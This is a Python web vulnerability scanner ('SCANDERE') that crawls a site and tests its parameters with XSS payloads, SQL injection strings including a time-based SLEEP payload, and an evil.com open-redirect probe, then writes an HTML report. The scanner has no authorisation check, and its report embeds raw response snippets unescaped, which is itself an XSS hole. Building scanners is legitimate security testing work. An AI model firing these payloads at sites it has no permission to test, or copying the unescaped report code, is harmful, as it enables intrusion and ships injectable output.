import os
import re
import time
import random
import requests
from bs4 import BeautifulSoup
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==============================================================
# 1️⃣  ENDPOINT DISCOVERY (Same domain only)
# ==============================================================

def discover_endpoints(domain: str, limit: int = 25) -> List[str]:
    """Discover same-domain endpoints and limit count for performance."""
    endpoints = []
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain

        base_parsed = urlparse(domain)
        base_host = base_parsed.netloc.replace("www.", "")

        response = requests.get(domain, timeout=3)
        soup = BeautifulSoup(response.text, 'html.parser')

        for a in soup.find_all('a', href=True):
            href = a['href']
            full_url = urljoin(domain, href)
            parsed = urlparse(full_url)
            host = parsed.netloc.replace("www.", "")

            # keep only same-domain links
            if base_host in host:
                endpoints.append(full_url)

        endpoints = list(dict.fromkeys(endpoints))  # remove duplicates
        if domain not in endpoints:
            endpoints.insert(0, domain)

        # Auto-limit endpoints for large sites
        if len(endpoints) > limit:
            print(f"[!] {len(endpoints)} endpoints found, limiting to top {limit} for faster scan.")
            endpoints = endpoints[:limit]

        return endpoints

    except Exception as e:
        print(f"Error discovering endpoints: {e}")
        return [domain]


# ==============================================================
# 2️⃣  PARAMETER HELPERS
# ==============================================================

COMMON_PARAMS = [
    "q", "search", "s", "query", "id", "page", "term", "keyword",
    "email", "name", "username", "redirect", "next", "url", "ref",
    "category", "view", "path", "lang", "file", "img", "title", "desc"
]

def extract_params_from_url(url: str) -> List[str]:
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query))
    return list(qs.keys()) or COMMON_PARAMS

def _build_url_with_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query))
    qs[param] = value
    new_query = urlencode(qs, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)


# ==============================================================
# 3️⃣  XSS DETECTION (Optimized Payloads)
# ==============================================================

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "'><script>alert(1)</script>", "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>", "<video><source onerror=alert(1)>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
    "javascript:alert(1)", "<a href='javascript:alert(1)'>click</a>"
]

def detect_xss(endpoint: str, timeout: int = 3, fast_mode: bool = False) -> Dict:
    """Detect reflected XSS with adaptive payload set."""
    headers = {"User-Agent": "Mozilla/5.0 (SCANDERE-XSS)"}
    found = False
    best_conf = 0.0
    best_method = None
    best_snippet = ""
    found_param = None

    try:
        params_to_test = extract_params_from_url(endpoint)
        # Use fewer payloads in fast mode
        payloads = XSS_PAYLOADS if fast_mode else XSS_PAYLOADS + [
            "<svg><script>alert(1)</script></svg>", "<math><mi><script>alert(1)</script></mi></math>"
        ]
        for param in params_to_test[:2]:  # limit per endpoint
            for payload in random.sample(payloads, min(8 if fast_mode else 15, len(payloads))):
                try:
                    r = requests.get(_build_url_with_param(endpoint, param, payload), timeout=timeout, headers=headers)
                    text = r.text or ""
                    if payload in text:
                        escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
                        snippet = text[:1000]
                        if escaped in text:
                            conf, method = 0.4, "reflected-escaped"
                        else:
                            conf, method = 0.85, "reflected-unescaped"
                        if conf > best_conf:
                            found, best_conf, best_method, best_snippet, found_param = True, conf, method, snippet, param
                except Exception:
                    continue
        return {
            "found": found,
            "confidence": best_conf,
            "method": best_method or "no-reflection",
            "snippet": best_snippet,
            "param": found_param
        }
    except Exception as e:
        return {"found": False, "confidence": 0.0, "method": "error", "error": str(e)}


# ==============================================================
# 4️⃣  SQL INJECTION DETECTION
# ==============================================================

SQLI_ERROR_PATTERNS = [
    "sql syntax", "syntax error", "mysql", "sql error", "ora-", "postgresql",
    "pdoexception", "warning: sqlite", "nativeclient::"
]
SQLI_TRUE = "1' OR '1'='1"
SQLI_FALSE = "1' OR '1'='2"
SQLI_SLEEP = "1' OR (SELECT IF(1=1, SLEEP(5), 0))-- "

def detect_sqli(endpoint: str, timeout: int = 3, do_time_test: bool = False) -> Dict:
    """Detect SQL Injection using error-based, boolean, and time-based (optional)."""
    parsed = urlparse(endpoint)
    qs = dict(parse_qsl(parsed.query))
    param = list(qs.keys())[0] if qs else 'id'

    def make_url(payload: str) -> str:
        return _build_url_with_param(endpoint, param, payload)

    try:
        r = requests.get(make_url("'"), timeout=timeout)
        body = (r.text or "").lower()
        snippet = body[:800]
        if any(pat in body for pat in SQLI_ERROR_PATTERNS):
            return {"found": True, "confidence": 0.65, "method": "error-based", "snippet": snippet}

        r_true = requests.get(make_url(SQLI_TRUE), timeout=timeout)
        r_false = requests.get(make_url(SQLI_FALSE), timeout=timeout)
        if r_true.text != r_false.text:
            diff_len = abs(len(r_true.text) - len(r_false.text))
            conf = 0.9 if diff_len > 80 else 0.65
            return {"found": True, "confidence": conf, "method": "boolean-diff", "snippet": r_true.text[:600]}

        if do_time_test:
            start = time.time()
            requests.get(make_url(SQLI_SLEEP), timeout=timeout + 5)
            if time.time() - start > 4:
                return {"found": True, "confidence": 0.95, "method": "time-based", "snippet": ""}

        return {"found": False, "confidence": 0.0, "method": "no-evidence", "snippet": snippet}
    except Exception as e:
        return {"found": False, "confidence": 0.0, "method": "error", "error": str(e)}


# ==============================================================
# 5️⃣  OPEN REDIRECT DETECTION
# ==============================================================

def detect_open_redirect(endpoint: str, timeout: int = 3) -> Dict:
    parsed = urlparse(endpoint)
    qs = dict(parse_qsl(parsed.query))
    param = list(qs.keys())[0] if qs else 'redirect'
    test_url = _build_url_with_param(endpoint, param, "https://evil.com")
    try:
        r = requests.get(test_url, allow_redirects=False, timeout=timeout)
        loc = r.headers.get('Location', '')
        found = False
        if r.status_code in (301, 302, 303, 307, 308) and "evil.com" in loc:
            found = True
        return {"found": found, "status_code": r.status_code, "location": loc, "confidence": 0.7 if found else 0.0}
    except Exception as e:
        return {"found": False, "status_code": None, "location": "", "confidence": 0.0, "error": str(e)}


# ==============================================================
# 6️⃣  PARALLEL SCANNING WRAPPER
# ==============================================================

def scan_single_endpoint(endpoint: str, confirm: bool = False, do_time_test: bool = False, fast_mode: bool = False) -> Dict:
    """Scan one endpoint."""
    result = {
        'endpoint': endpoint,
        'xss': {"found": False, "confidence": 0.0, "method": None, "snippet": ""},
        'sqli': {"found": False, "confidence": 0.0, "method": None, "snippet": ""},
        'open_redirect': {"found": False, "status_code": None, "location": "", "confidence": 0.0}
    }

    try:
        result['xss'].update(detect_xss(endpoint, fast_mode=fast_mode))
    except Exception as e:
        result['xss'].update({"found": False, "method": "error", "error": str(e)})

    try:
        result['sqli'].update(detect_sqli(endpoint, do_time_test=(confirm and do_time_test)))
    except Exception as e:
        result['sqli'].update({"found": False, "method": "error", "error": str(e)})

    try:
        result['open_redirect'].update(detect_open_redirect(endpoint))
    except Exception as e:
        result['open_redirect'].update({"found": False, "method": "error", "error": str(e)})

    return result


def check_web_flaws(endpoints: List[str], confirm: bool = False, do_time_test: bool = False, fast_mode: bool = False) -> List[Dict]:
    """Run all vulnerability checks concurrently."""
    results = []
    with ThreadPoolExecutor(max_workers=12) as executor:
        future_to_ep = {
            executor.submit(scan_single_endpoint, ep, confirm, do_time_test, fast_mode): ep
            for ep in endpoints
        }
        for i, future in enumerate(as_completed(future_to_ep), 1):
            ep = future_to_ep[future]
            try:
                result = future.result()
                print(f"[{i}/{len(endpoints)}] Scanned: {ep}")
                results.append(result)
            except Exception as e:
                print(f"Error scanning {ep}: {e}")
    return results


# ==============================================================
# 7️⃣  HTML REPORT GENERATOR (unchanged)
# ==============================================================

def generate_html_report(results: List[Dict], filename: str, summary: Dict = None):
    """Generate dark-themed HTML report."""
    if summary is None:
        summary = {
            "target": "",
            "endpoints_scanned": len(results),
            "endpoints_with_issues": sum(
                1 for r in results if (r.get('xss', {}).get('found') or r.get('sqli', {}).get('found') or r.get('open_redirect', {}).get('found'))
            )
        }

    css = """
    body { background-color: #0b0f13; color: #e6eef8; font-family: Arial; padding: 20px; }
    .title { color: #00d1ff; font-size: 32px; margin-bottom: 5px; }
    .subtitle { color: #9ad7ff; margin-bottom: 10px; }
    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
    th, td { padding: 10px; border: 1px solid #20272b; text-align: left; vertical-align: top; }
    th { background: #071018; color: #9ad7ff; }
    tr:nth-child(even) { background: #071018; }
    .safe { background: #0b3b12; color: #b7f5c7; }
    .vuln { background: #3b0b0b; color: #ffb7b7; }
    .warn { background: #3b2b0b; color: #ffe9b7; }
    .confidence { font-size: 12px; color: #b7cbd8; }
    .snippet { font-family: monospace; white-space: pre-wrap; max-height: 160px; overflow: auto; background: #061014; padding: 8px; border: 1px solid #23303a; margin-top:6px; color: #dbeffc; }
    .summary { margin-top: 10px; padding: 10px; background: #071018; border: 1px solid #23303a; }
    details { margin-top: 6px; }
    """

    html = [
        "<!doctype html>",
        "<html><head><meta charset='utf-8'><title>SCANDERE - Scan Report</title>",
        f"<style>{css}</style></head><body>",
        "<div class='title'>SCAN REPORT - SCANDERE</div>",
        "<div class='subtitle'>Generated by SCANDERE</div>",
        "<div class='summary'>"
        f"<strong>Endpoints scanned:</strong> {summary.get('endpoints_scanned', 0)} &nbsp;&nbsp;"
        f"<strong>Endpoints with issues:</strong> {summary.get('endpoints_with_issues', 0)}"
        "</div>",
        "<table>",
        "<thead><tr><th>Endpoint</th><th>XSS</th><th>SQLi</th><th>Open Redirect</th></tr></thead>",
        "<tbody>"
    ]

    for r in results:
        def vuln_cell(v):
            found, conf, method = v.get('found'), v.get('confidence', 0.0), v.get('method', '')
            snippet = v.get('snippet', '')
            if found:
                cls = "vuln" if conf >= 0.75 else "warn"
                return f"<td class='{cls}'>FOUND<br><span class='confidence'>conf: {conf:.2f}, method: {method}</span>" + \
                       (f"<details><summary>snippet</summary><div class='snippet'>{snippet}</div></details>" if snippet else "") + "</td>"
            return f"<td class='safe'>SAFE<br><span class='confidence'>conf: {conf:.2f}</span></td>"

        def redirect_cell(v):
            if v.get('found'):
                return f"<td class='warn'>POTENTIAL<br><span class='confidence'>status: {v.get('status_code')}, conf: {v.get('confidence', 0.0):.2f}</span></td>"
            return f"<td class='safe'>SAFE<br><span class='confidence'>conf: {v.get('confidence', 0.0):.2f}</span></td>"

        html.append("<tr>")
        html.append(f"<td>{r.get('endpoint')}</td>")
        html.append(vuln_cell(r.get('xss', {})))
        html.append(vuln_cell(r.get('sqli', {})))
        html.append(redirect_cell(r.get('open_redirect', {})))
        html.append("</tr>")

    html.append("</tbody></table></body></html>")
    os.makedirs(os.path.dirname(filename) or ".", exist_ok=True)
    with open(filename, "w", encoding="utf-8") as f:
        f.write("\n".join(html))
